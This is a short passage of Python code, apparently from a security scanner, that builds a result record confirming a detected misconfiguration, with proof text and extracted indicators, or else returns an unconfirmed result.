                                "confirmed": True,
                                "method": "Misconfiguration verified",
                                "proof": f"Found {len(found)} misconfiguration indicators",
                                "extracted_data": found,
                                "depth": "config_issue",
                                "title_detail": ", ".join(found.keys()),
                                "impact_addition": f"Misconfiguration confirmed: {json.dumps(found, indent=2)}",
                            }
            except Exception:
                pass

        return {"confirmed": False}
